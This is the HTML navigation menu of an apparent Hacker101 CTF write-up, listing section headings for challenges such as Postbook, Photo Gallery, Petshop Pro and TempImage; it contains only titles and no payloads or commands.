class="nav-number">1.11.1.</span> <span class="nav-text">0x00 Index</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Log-In"><span class="nav-number">1.11.2.</span> <span class="nav-text">0x01 Log In</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-Try-Add-‘"><span class="nav-number">1.11.3.</span> <span class="nav-text">0x02 Try Add ‘</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-Bypass-Login"><span class="nav-number">1.11.4.</span> <span class="nav-text">0x03 Bypass Login</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-Private-Page-FLAG"><span class="nav-number">1.11.5.</span> <span class="nav-text">0x04 Private Page (FLAG)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Micro-CMS-v2-FLAG1"><span class="nav-number">1.12.</span> <span class="nav-text">Micro-CMS v2 - FLAG1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-Index-6"><span class="nav-number">1.12.1.</span> <span class="nav-text">0x00 Index</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Edit"><span class="nav-number">1.12.2.</span> <span class="nav-text">0x01 Edit</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#GET"><span class="nav-number">1.12.2.1.</span> <span class="nav-text">GET</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#POST-FLAG"><span class="nav-number">1.12.2.2.</span> <span class="nav-text">POST (FLAG)</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Micro-CMS-v2-FLAG2"><span class="nav-number">1.13.</span> <span class="nav-text">Micro-CMS v2 - FLAG2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-Index-7"><span class="nav-number">1.13.1.</span> <span class="nav-text">0x00 Index</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Log-In-1"><span class="nav-number">1.13.2.</span> <span class="nav-text">0x01 Log In</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-FLAG"><span class="nav-number">1.13.3.</span> <span class="nav-text">0x02 FLAG</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Encrypted-Pastebin"><span class="nav-number">1.14.</span> <span class="nav-text">Encrypted Pastebin</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag0-–-Found-3"><span class="nav-number">1.14.1.</span> <span class="nav-text">Flag0 – Found</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag1-–-Not-Found"><span class="nav-number">1.14.2.</span> <span class="nav-text">Flag1 – Not Found</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag2-–-Not-Found"><span class="nav-number">1.14.3.</span> <span class="nav-text">Flag2 – Not Found</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag3-–-Not-Found"><span class="nav-number">1.14.4.</span> <span class="nav-text">Flag3 – Not Found</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Encrypted-Pastebin-FLAG0"><span class="nav-number">1.15.</span> <span class="nav-text">Encrypted Pastebin - FLAG0</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-Home"><span class="nav-number">1.15.1.</span> <span class="nav-text">0x00 Home</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Try-Post"><span class="nav-number">1.15.2.</span> <span class="nav-text">0x01 Try Post</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-Modify-the-Param"><span class="nav-number">1.15.3.</span> <span class="nav-text">0x02 Modify the Param</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Photo-Gallery"><span class="nav-number">1.16.</span> <span class="nav-text">Photo Gallery</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag0-–-Found-4"><span class="nav-number">1.16.1.</span> <span class="nav-text">Flag0 – Found</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag1-–-Found-2"><span class="nav-number">1.16.2.</span> <span class="nav-text">Flag1 – Found</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag2-–-Found-2"><span class="nav-number">1.16.3.</span> <span class="nav-text">Flag2 – Found</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Photo-Gallery-FLAG0"><span class="nav-number">1.17.</span> <span class="nav-text">Photo Gallery - FLAG0</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-Check-Image-Source"><span class="nav-number">1.17.1.</span> <span class="nav-text">0x00 Check Image Source</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Arbitrary-File-Read"><span class="nav-number">1.17.2.</span> <span class="nav-text">0x01 Arbitrary File Read</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-uwsgi-nginx-flask-docker"><span class="nav-number">1.17.3.</span> <span class="nav-text">0x02 uwsgi-nginx-flask-docker</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Photo-Gallery-FLAG1"><span class="nav-number">1.18.</span> <span class="nav-text">Photo Gallery - FLAG1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-Index-8"><span class="nav-number">1.18.1.</span> <span class="nav-text">0x00 Index</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Check-Image-Source"><span class="nav-number">1.18.2.</span> <span class="nav-text">0x01 Check Image Source</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-Blind-Injection"><span class="nav-number">1.18.3.</span> <span class="nav-text">0x02 Blind Injection</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Photo-Gallery-FLAG2"><span class="nav-number">1.19.</span> <span class="nav-text">Photo Gallery - FLAG2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-Space-Used"><span class="nav-number">1.19.1.</span> <span class="nav-text">0x00 Space Used</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Stacked-Queries"><span class="nav-number">1.19.2.</span> <span class="nav-text">0x01 Stacked Queries</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-Remote-Code-Execution"><span class="nav-number">1.19.3.</span> <span class="nav-text">0x02 Remote Code Execution</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-FLAG-3"><span class="nav-number">1.19.4.</span> <span class="nav-text">0x03 FLAG</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cody’s-First-Blog"><span class="nav-number">1.20.</span> <span class="nav-text">Cody’s First Blog</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag0-–-Found-5"><span class="nav-number">1.20.1.</span> <span class="nav-text">Flag0 – Found</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag1-–-Found-3"><span class="nav-number">1.20.2.</span> <span class="nav-text">Flag1 – Found</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag2-–-Found-3"><span class="nav-number">1.20.3.</span> <span class="nav-text">Flag2 – Found</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cody’s-First-Blog-FLAG0"><span class="nav-number">1.21.</span> <span class="nav-text">Cody’s First Blog - FLAG0</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-Home-1"><span class="nav-number">1.21.1.</span> <span class="nav-text">0x00 Home</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Try-with-Comment"><span class="nav-number">1.21.2.</span> <span class="nav-text">0x01 Try with Comment</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-FLAG-1"><span class="nav-number">1.21.3.</span> <span class="nav-text">0x02 FLAG</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cody’s-First-Blog-FLAG1"><span class="nav-number">1.22.</span> <span class="nav-text">Cody’s First Blog - FLAG1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-Home-2"><span class="nav-number">1.22.1.</span> <span class="nav-text">0x00 Home</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Check-the-Source"><span class="nav-number">1.22.2.</span> <span class="nav-text">0x01 Check the Source</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-Visit-Admin-Page"><span class="nav-number">1.22.3.</span> <span class="nav-text">0x02 Visit Admin Page</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-FLAG-4"><span class="nav-number">1.22.4.</span> <span class="nav-text">0x03 FLAG</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cody’s-First-Blog-FLAG2"><span class="nav-number">1.23.</span> <span class="nav-text">Cody’s First Blog - FLAG2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-Modifiy-URL-Parameter"><span class="nav-number">1.23.1.</span> <span class="nav-text">0x00 Modifiy URL Parameter</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-SSRF-Inclusion-Bug"><span class="nav-number">1.23.2.</span> <span class="nav-text">0x01 SSRF / Inclusion Bug</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-Read-File"><span class="nav-number">1.23.3.</span> <span class="nav-text">0x02 Read File</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-FLAG-5"><span class="nav-number">1.23.4.</span> <span class="nav-text">0x03 FLAG</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Postbook"><span class="nav-number">1.24.</span> <span class="nav-text">Postbook</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag0-–-Found-6"><span class="nav-number">1.24.1.</span> <span class="nav-text">Flag0 – Found</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag1-–-Found-4"><span class="nav-number">1.24.2.</span> <span class="nav-text">Flag1 – Found</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag2-–-Found-4"><span class="nav-number">1.24.3.</span> <span class="nav-text">Flag2 – Found</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag3-–-Found-1"><span class="nav-number">1.24.4.</span> <span class="nav-text">Flag3 – Found</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag4-–-Found"><span class="nav-number">1.24.5.</span> <span class="nav-text">Flag4 – Found</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag5-–-Found"><span class="nav-number">1.24.6.</span> <span class="nav-text">Flag5 – Found</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag6-–-Found"><span class="nav-number">1.24.7.</span> <span class="nav-text">Flag6 – Found</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Postbook-FLAG0"><span class="nav-number">1.25.</span> <span class="nav-text">Postbook - FLAG0</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-Index-9"><span class="nav-number">1.25.1.</span> <span class="nav-text">0x00 Index</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Log-In-2"><span class="nav-number">1.25.2.</span> <span class="nav-text">0x01 Log In</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-FLAG-2"><span class="nav-number">1.25.3.</span> <span class="nav-text">0x02 FLAG</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Postbook-FLAG1"><span class="nav-number">1.26.</span> <span class="nav-text">Postbook - FLAG1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-View-Post"><span class="nav-number">1.26.1.</span> <span class="nav-text">0x00 View Post</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-FLAG"><span class="nav-number">1.26.2.</span> <span class="nav-text">0x01 FLAG</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Postbook-FLAG2"><span class="nav-number">1.27.</span> <span class="nav-text">Postbook - FLAG2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-New-Post"><span class="nav-number">1.27.1.</span> <span class="nav-text">0x00 New Post</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-FLAG-1"><span class="nav-number">1.27.2.</span> <span class="nav-text">0x01 FLAG</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Postbook-FLAG3"><span class="nav-number">1.28.</span> <span class="nav-text">Postbook - FLAG3</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-View-Post-1"><span class="nav-number">1.28.1.</span> <span class="nav-text">0x00 View Post</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-FLAG-2"><span class="nav-number">1.28.2.</span> <span class="nav-text">0x01 FLAG</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Postbook-FLAG4"><span class="nav-number">1.29.</span> <span class="nav-text">Postbook - FLAG4</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-Edit-Post"><span class="nav-number">1.29.1.</span> <span class="nav-text">0x00 Edit Post</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Edit-Others-Post"><span class="nav-number">1.29.2.</span> <span class="nav-text">0x01 Edit Others Post</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-FLAG-3"><span class="nav-number">1.29.3.</span> <span class="nav-text">0x02 FLAG</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Postbook-FLAG5"><span class="nav-number">1.30.</span> <span class="nav-text">Postbook - FLAG5</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-Cookie"><span class="nav-number">1.30.1.</span> <span class="nav-text">0x00 Cookie</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Admin-Cookie"><span class="nav-number">1.30.2.</span> <span class="nav-text">0x01 Admin Cookie</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-FLAG-4"><span class="nav-number">1.30.3.</span> <span class="nav-text">0x02 FLAG</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Postbook-FLAG6"><span class="nav-number">1.31.</span> <span class="nav-text">Postbook - FLAG6</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-Delete-Post"><span class="nav-number">1.31.1.</span> <span class="nav-text">0x00 Delete Post</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Delete-Others"><span class="nav-number">1.31.2.</span> <span class="nav-text">0x01 Delete Others</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-FLAG-5"><span class="nav-number">1.31.3.</span> <span class="nav-text">0x02 FLAG</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Ticketastic-Live-Instance"><span class="nav-number">1.32.</span> <span class="nav-text">Ticketastic: Live Instance</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag0-–-Found-7"><span class="nav-number">1.32.1.</span> <span class="nav-text">Flag0 – Found</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag1-–-Found-5"><span class="nav-number">1.32.2.</span> <span class="nav-text">Flag1 – Found</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Ticketastic-Live-Instance-FLAG0"><span class="nav-number">1.33.</span> <span class="nav-text">Ticketastic: Live Instance - FLAG0</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-Index-10"><span class="nav-number">1.33.1.</span> <span class="nav-text">0x00 Index</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Login"><span class="nav-number">1.33.2.</span> <span class="nav-text">0x01 Login</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-Submit-Ticket"><span class="nav-number">1.33.3.</span> <span class="nav-text">0x02 Submit Ticket</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-Login-with-New-Account"><span class="nav-number">1.33.4.</span> <span class="nav-text">0x03 Login with New Account</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-FLAG-1"><span class="nav-number">1.33.5.</span> <span class="nav-text">0x04 FLAG</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Ticketastic-Live-Instance-FLAG1"><span class="nav-number">1.34.</span> <span class="nav-text">Ticketastic: Live Instance - FLAG1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-Ticket-Page"><span class="nav-number">1.34.1.</span> <span class="nav-text">0x00 Ticket Page</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Try-Modify-Parameters"><span class="nav-number">1.34.2.</span> <span class="nav-text">0x01 Try Modify Parameters</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-Get-Table-Fields-Number"><span class="nav-number">1.34.3.</span> <span class="nav-text">0x02 Get Table Fields Number</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-Check-Output-Locations"><span class="nav-number">1.34.4.</span> <span class="nav-text">0x03 Check Output Locations</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-Get-Current-Database-Version-TABLE-SCHEMA"><span class="nav-number">1.34.5.</span> <span class="nav-text">0x04 Get Current Database Version, TABLE_SCHEMA</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-Get-TABLE-NAME"><span class="nav-number">1.34.6.</span> <span class="nav-text">0x05 Get TABLE_NAME</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x06-Get-COLUMN-NAME"><span class="nav-number">1.34.7.</span> <span class="nav-text">0x06 Get COLUMN_NAME</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x07-Dump-Data-FLAG"><span class="nav-number">1.34.8.</span> <span class="nav-text">0x07 Dump Data (FLAG)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x08-Why-Do-Not-Use-SQLMAP"><span class="nav-number">1.34.9.</span> <span class="nav-text">0x08 Why Do Not Use SQLMAP?</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Catch-the-Request-and-Save-to-a-File"><span class="nav-number">1.34.9.1.</span> <span class="nav-text">Catch the Request and Save to a File</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Petshop-Pro"><span class="nav-number">1.35.</span> <span class="nav-text">Petshop Pro</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag0-–-Found-8"><span class="nav-number">1.35.1.</span> <span class="nav-text">Flag0 – Found</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag1-–-Found-6"><span class="nav-number">1.35.2.</span> <span class="nav-text">Flag1 – Found</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag2-–-Found-5"><span class="nav-number">1.35.3.</span> <span class="nav-text">Flag2 – Found</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Petshop-Pro-FLAG0"><span class="nav-number">1.36.</span> <span class="nav-text">Petshop Pro - FLAG0</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-Index-11"><span class="nav-number">1.36.1.</span> <span class="nav-text">0x00 Index</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Shopping-Cart"><span class="nav-number">1.36.2.</span> <span class="nav-text">0x01 Shopping Cart</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-Change-Price-to-0"><span class="nav-number">1.36.3.</span> <span class="nav-text">0x02 Change Price to 0</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-FLAG-6"><span class="nav-number">1.36.4.</span> <span class="nav-text">0x03 FLAG</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Petshop-Pro-FLAG1"><span class="nav-number">1.37.</span> <span class="nav-text">Petshop Pro - FLAG1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-Index-12"><span class="nav-number">1.37.1.</span> <span class="nav-text">0x00 Index</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Path-Scan"><span class="nav-number">1.37.2.</span> <span class="nav-text">0x01 Path Scan</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-Admin-Login-path"><span class="nav-number">1.37.3.</span> <span class="nav-text">0x02 Admin Login path</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-Try-Login"><span class="nav-number">1.37.4.</span> <span class="nav-text">0x03 Try Login</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-Get-Username"><span class="nav-number">1.37.5.</span> <span class="nav-text">0x04 Get Username</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-Get-Password"><span class="nav-number">1.37.6.</span> <span class="nav-text">0x05 Get Password</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x06-FLAG"><span class="nav-number">1.37.7.</span> <span class="nav-text">0x06 FLAG</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Petshop-Pro-FLAG2"><span class="nav-number">1.38.</span> <span class="nav-text">Petshop Pro - FLAG2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-Admin-Index"><span class="nav-number">1.38.1.</span> <span class="nav-text">0x00 Admin Index</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Edit-Page"><span class="nav-number">1.38.2.</span> <span class="nav-text">0x01 Edit Page</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-FLAG-6"><span class="nav-number">1.38.3.</span> <span class="nav-text">0x02 FLAG</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Model-E1337-Rolling-Code-Lock"><span class="nav-number">1.39.</span> <span class="nav-text">Model E1337 - Rolling Code Lock</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag0-–-Found-9"><span class="nav-number">1.39.1.</span> <span class="nav-text">Flag0 – Found</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag1-–-Not-Found-1"><span class="nav-number">1.39.2.</span> <span class="nav-text">Flag1 – Not Found</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Model-E1337-Rolling-Code-Lock-FLAG0"><span class="nav-number">1.40.</span> <span class="nav-text">Model E1337 - Rolling Code Lock - FLAG0</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-Home-3"><span class="nav-number">1.40.1.</span> <span class="nav-text">0x00 Home</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Directory"><span class="nav-number">1.40.2.</span> <span class="nav-text">0x01 Directory</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-get-config"><span class="nav-number">1.40.3.</span> <span class="nav-text">0x02 get-config</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-set-config"><span class="nav-number">1.40.4.</span> <span class="nav-text">0x03 set-config</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-XXE"><span class="nav-number">1.40.5.</span> <span class="nav-text">0x04 XXE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-main-py"><span class="nav-number">1.40.6.</span> <span class="nav-text">0x05 main.py</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TempImage"><span class="nav-number">1.41.</span> <span class="nav-text">TempImage</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag0-–-Found-10"><span class="nav-number">1.41.1.</span> <span class="nav-text">Flag0 – Found</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag1-–-Found-7"><span class="nav-number">1.41.2.</span> <span class="nav-text">Flag1 – Found</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TempImage-FLAG0"><span class="nav-number">1.42.</span> <span class="nav-text">TempImage - FLAG0</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-Index-13"><span class="nav-number">1.42.1.</span> <span class="nav-text">0x00 Index</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Upload"><span class="nav-number">1.42.2.</span> <span class="nav-text">0x01 Upload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-Modify-File-Name"><span class="nav-number">1.42.3.</span> <span class="nav-text">0x02 Modify File Name</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-Upload-Error-and-FLAG"><span class="nav-number">1.42.4.</span> <span class="nav-text">0x03 Upload Error and FLAG</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TempImage-FLAG1"><span class="nav-number">1.43.</span> <span class="nav-text">TempImage - FLAG1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-Index-14"><span class="nav-number">1.43.1.</span> <span class="nav-text">0x00 Index</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Generate-Image-Shell"><span class="nav-number">1.43.2.</span> <span class="nav-text">0x01 Generate Image Shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-Upload-the-Image-Shell"><span class="nav-number">1.43.3.</span> <span class="nav-text">0x02 Upload the Image Shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-Connect-Server"><span class="nav-number">1.43.4.</span> <span class="nav-text">0x03 Connect Server</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-FLAG-2"><span class="nav-number">1.43.5.</span> <span class="nav-text">0x04 FLAG</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#H1-Thermostat"><span class="nav-number">1.44.</span> <span class="nav-text">H1 Thermostat</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag0-–-Found-11"><span class="nav-number">1.44.1.</span> <span class="nav-text">Flag0 – Found</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag1-–-Found-8"><span class="nav-number">1.44.2.</span> <span class="nav-text">Flag1 – Found</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#H1-Thermostat-FLAG0"><span class="nav-number">1.45.</span> <span class="nav-text">H1 Thermostat - FLAG0</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-Configure-Proxy"><span class="nav-number">1.45.1.</span> <span class="nav-text">0x00 Configure Proxy</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Install-APK"><span class="nav-number">1.45.2.</span> <span class="nav-text">0x01 Install APK</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#H1-Thermostat-FLAG1"><span class="nav-number">1.46.</span> <span class="nav-text">H1 Thermostat - FLAG1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-Params"><span class="nav-number">1.46.1.</span> <span class="nav-text">0x00 Params</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Check-Source"><span class="nav-number">1.46.2.</span> <span class="nav-text">0x01 Check Source</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Intentional-Exercise"><span class="nav-number">1.47.</span> <span class="nav-text">Intentional Exercise</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag0-–-Found-12"><span class="nav-number">1.47.1.</span> <span class="nav-text">Flag0 – Found</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Intentional-Exercise-FLAG0"><span class="nav-number">1.48.</span> <span class="nav-text">Intentional Exercise - FLAG0</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-App-Home"><span class="nav-number">1.48.1.</span> <span class="nav-text">0x00 App Home</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Mutate-Request"><span class="nav-number">1.48.2.</span> <span class="nav-text">0x01 Mutate Request</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-Check-Source"><span class="nav-number">1.48.3.</span> <span class="nav-text">0x02 Check Source</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Dex-to-Jar"><span class="nav-number">1.48.3.1.</span> <span class="nav-text">Dex to Jar</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Decompile"><span class="nav-number">1.48.3.2.</span> <span class="nav-text">Decompile</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-Code-Review"><span class="nav-number">1.48.4.</span> <span class="nav-text">0x03 Code Review</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-Get-Hash"><span class="nav-number">1.48.5.</span> <span class="nav-text">0x04 Get Hash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-FLAG"><span class="nav-number">1.48.6.</span> <span class="nav-text">0x05 FLAG</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BugDB-v1"><span class="nav-number">1.49.</span> <span class="nav-text">BugDB v1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag0-–-Found-13"><span class="nav-number">1.49.1.</span> <span class="nav-text">Flag0 – Found</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" 